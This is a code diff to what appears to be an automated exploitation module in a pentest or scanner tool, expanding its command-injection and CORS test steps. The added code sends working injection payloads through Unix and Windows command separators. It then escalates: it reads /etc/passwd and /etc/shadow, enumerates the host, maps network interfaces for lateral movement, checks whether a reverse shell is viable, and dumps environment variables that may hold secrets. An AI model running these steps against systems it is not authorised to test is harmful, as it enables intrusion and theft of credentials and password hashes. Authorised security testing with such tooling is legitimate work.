@@ -2841,50 +2841,205 @@ def _build_exploit_steps(etype: str, param: str, ei: dict,
         ])
 
     elif etype == "command_injection":
+        # Determine injection method from scan finding
+        _cmdi_method = ei.get("method", "GET").upper()
+        _cmdi_path = ei.get("path", "")
+
+        # Baseline response for differential comparison
+        _baseline_len = [0]  # mutable container for closure
+
         def _cmdi_check(r: ExploitResult):
+            """Detect command execution evidence in response."""
             body = r.response_body
+            # Strong indicators — command output present
+            uid_match = _re.search(r"uid=(\d+)\((\w+)\)", body)
+            if uid_match:
+                r.success = True
+                r.confidence = 0.97
+                r.evidence = f"Command executed: uid={uid_match.group(1)}({uid_match.group(2)})"
+                r.false_positive_risk = "very_low"
+                return
             if _re.search(r"uid=\d+", body):
                 r.success = True
                 r.confidence = 0.95
-                r.evidence = "uid= found — command execution confirmed"
+                r.evidence = "uid= pattern found — command execution confirmed"
                 r.false_positive_risk = "very_low"
-            elif "root:" in body and ":0:0:" in body:
+                return
+            # /etc/passwd content
+            if "root:" in body and ":0:" in body and "/bin" in body:
+                r.success = True
+                r.confidence = 0.93
+                r.evidence = "/etc/passwd content detected (root entry with shell)"
+                r.false_positive_risk = "very_low"
+                return
+            # Linux version string from uname
+            uname_m = _re.search(r"Linux\s+\S+\s+\d+\.\d+\.\d+", body)
+            if uname_m:
                 r.success = True
                 r.confidence = 0.9
-                r.evidence = "/etc/passwd content in response"
+                r.evidence = f"uname output: {uname_m.group(0)[:60]}"
                 r.false_positive_risk = "low"
-            elif r.status_code == 200 and len(body) > 10:
-                r.confidence = 0.3
-                r.evidence = "Got response — verify manually"
+                return
+            # Windows indicators from systeminfo/ver
+            if _re.search(r"Microsoft Windows|Windows NT|WINDOWS\\", body):
+                r.success = True
+                r.confidence = 0.85
+                r.evidence = "Windows OS string detected in response"
+                r.false_positive_risk = "low"
+                return
+            # Differential: response significantly different from baseline
+            if _baseline_len[0] > 0:
+                diff = abs(len(body) - _baseline_len[0])
+                ratio = diff / max(_baseline_len[0], 1)
+                if ratio > 0.3 and len(body) > 50:
+                    r.confidence = 0.4
+                    r.evidence = (f"Response size changed: baseline={_baseline_len[0]}, "
+                                  f"current={len(body)} (delta={diff})")
+                    r.false_positive_risk = "medium"
+                    return
+            # No evidence — explicitly mark as not confirmed
+            if r.status_code == 200:
+                r.confidence = 0.1
+                r.evidence = "HTTP 200 but no command output detected"
+                r.false_positive_risk = "high"
 
-        separators = [
-            (";id", "Semicolon"),
-            ("|id", "Pipe"),
-            ("$(id)", "$() subshell"),
+        def _cmdi_baseline(r: ExploitResult):
+            """Capture baseline response for differential comparison."""
+            _baseline_len[0] = len(r.response_body)
+            r.evidence = f"Baseline captured: {_baseline_len[0]} bytes, HTTP {r.status_code}"
+
+        def _cmdi_passwd_check(r: ExploitResult):
+            """Specifically check for /etc/passwd content."""
+            body = r.response_body
+            passwd_lines = [l for l in body.split("\n")
+                           if _re.match(r"^\w+:[x*!]?:\d+:\d+:", l)]
+            if passwd_lines:
+                r.success = True
+                r.confidence = 0.95
+                r.evidence = f"/etc/passwd: {len(passwd_lines)} user entries found"
+                r.false_positive_risk = "very_low"
+            else:
+                _cmdi_check(r)
+
+        def _cmdi_enum_check(r: ExploitResult):
+            """Parse system enumeration output."""
+            body = r.response_body
+            findings = []
+            uname_m = _re.search(r"Linux\s+\S+\s+[\d.]+-\S+", body)
+            if uname_m:
+                findings.append(f"kernel={uname_m.group(0)[:50]}")
+            whoami_m = _re.search(r"(?:^|\n)(\w+)\s*$", body, _re.M)
+            if whoami_m and whoami_m.group(1) not in ("", "GET", "POST", "HTTP"):
+                findings.append(f"user={whoami_m.group(1)}")
+            pwd_m = _re.search(r"(/[\w/.-]+)", body)
+            if pwd_m:
+                findings.append(f"pwd={pwd_m.group(1)[:40]}")
+            if findings:
+                r.success = True
+                r.confidence = 0.85
+                r.evidence = "; ".join(findings)
+                r.false_positive_risk = "low"
+            else:
+                _cmdi_check(r)
+
+        def _inject_request(payload: str) -> dict:
+            """Build injection request matching the original vuln method."""
+            if _cmdi_method == "POST":
+                return _post(target_base if _cmdi_path else target,
+                             {param: payload})
+            else:
+                return _get_param(payload)
+
+        # Unix command separators (most to least common)
+        unix_seps = [
+            (";id", "Semicolon (;)"),
+            ("|id", "Pipe (|)"),
+            ("$(id)", "Subshell $()"),
             ("`id`", "Backtick"),
+            ("\nid", "Newline"),
+            ("&&id", "AND (&&)"),
+            ("||id", "OR (||)"),
         ]
+        # Windows command separators
+        win_seps = [
+            ("&whoami", "Ampersand (&)"),
+            ("|whoami", "Pipe (|)"),
+            ("\r\nwhoami", "CRLF"),
+        ]
+
         steps = [
+            # Step 0: Capture baseline (no injection) for differential
+            {"title": "Capture baseline response",
+             "request": _get(target),
+             "validate": _cmdi_baseline,
+             "note": "Baseline for differential comparison with injected responses"},
+            # Step 1: Confirm original scanner finding
             {"title": "Confirm original finding",
              "request": _get(target),
              "validate": _cmdi_check,
-             "note": "Check if the scan's original URL returns command output"},
+             "note": "Re-check the scanner's original vulnerable URL"},
         ]
-        for payload, sep_name in separators:
+
+        # Unix separator tests
+        for payload, sep_name in unix_seps:
             steps.append({
-                "title": f"Test {sep_name} separator",
-                "request": _get_param(payload),
+                "title": f"Unix: {sep_name}",
+                "request": _inject_request(payload),
                 "validate": _cmdi_check,
-                "note": f"Injects via {sep_name}",
+                "note": f"Tests command separator: {sep_name}",
             })
+
+        # Windows separator tests (lower priority)
+        for payload, sep_name in win_seps:
+            steps.append({
+                "title": f"Windows: {sep_name}",
+                "request": _inject_request(payload),
+                "validate": _cmdi_check,
+                "note": f"Windows-specific separator: {sep_name}",
+            })
+
+        # Escalation steps
         steps.extend([
             {"title": "Read /etc/passwd",
-             "request": _get_param(";cat /etc/passwd"),
-             "validate": _cmdi_check,
+             "request": _inject_request(";cat /etc/passwd"),
+             "validate": _cmdi_passwd_check,
              "warning": "Reads system user file"},
-            {"title": "System enumeration",
-             "request": _get_param(";uname -a;whoami;pwd"),
+            {"title": "Read /etc/shadow (if root)",
+             "request": _inject_request(";cat /etc/shadow"),
              "validate": _cmdi_check,
-             "note": "Gathers OS, user, directory info"},
+             "warning": "Reads password hashes",
+             "risk": "HIGH"},
+            {"title": "System enumeration",
+             "request": _inject_request(";uname -a;whoami;id;pwd"),
+             "validate": _cmdi_enum_check,
+             "note": "Gathers OS version, user, uid, and working directory"},
+            {"title": "Network interfaces",
+             "request": _inject_request(";ip addr 2>/dev/null || ifconfig"),
+             "validate": _cmdi_check,
+             "note": "Maps network configuration for lateral movement"},
+            {"title": "Check outbound connectivity",
+             "request": _inject_request(";curl -s -o /dev/null -w '%{http_code}' http://example.com"),
+             "validate": lambda r: (
+                 setattr(r, 'success', "200" in r.response_body) or
+                 setattr(r, 'confidence', 0.8 if "200" in r.response_body else 0.2) or
+                 setattr(r, 'evidence',
+                         "Server can reach internet — reverse shell viable"
+                         if "200" in r.response_body
+                         else "No outbound — consider bind shell or data exfil via DNS")
+             ),
+             "note": "Tests if reverse shell is possible (server can reach out)"},
+            {"title": "List environment variables",
+             "request": _inject_request(";env"),
+             "validate": lambda r: (
+                 setattr(r, 'success', "PATH=" in r.response_body) or
+                 setattr(r, 'confidence', 0.9 if "PATH=" in r.response_body else 0.2) or
+                 setattr(r, 'evidence',
+                         f"Environment dumped: {len(r.response_body)} bytes"
+                         if "PATH=" in r.response_body
+                         else "No env output detected")
+             ),
+             "warning": "Dumps process environment — may contain secrets",
+             "risk": "HIGH"},
         ])
 
     elif etype == "ssrf":
@@ -3208,15 +3363,16 @@ def _build_exploit_steps(etype: str, param: str, ei: dict,
                     r.evidence = f"ACAO={acao or 'absent'}"
             return _check
 
+        _evil_origin = "https://attacker-test-" + secrets.token_hex(4) + ".com"
         steps = [
-            {"title": "Test CORS with evil.com origin",
-             "request": _get(target, extra_headers={"Origin": "https://evil.com"}),
-             "validate": _cors_check("https://evil.com"),
-             "note": "Look for reflected origin in ACAO header"},
+            {"title": "Test CORS origin reflection",
+             "request": _get(target, extra_headers={"Origin": _evil_origin}),
+             "validate": _cors_check(_evil_origin),
+             "note": f"Sends Origin: {_evil_origin} header to target, checks if reflected in ACAO"},
             {"title": "Check credentials allowed",
-             "request": _get(target, extra_headers={"Origin": "https://evil.com"}),
-             "validate": _cors_check("https://evil.com"),
-             "note": "ACAC: true = authenticated data theft possible"},
+             "request": _get(target, extra_headers={"Origin": _evil_origin}),
+             "validate": _cors_check(_evil_origin),
+             "note": "ACAC: true = authenticated data can be stolen cross-origin"},
             {"title": "Test null origin (sandbox bypass)",
              "request": _get(target, extra_headers={"Origin": "null"}),
              "validate": _cors_check("null"),
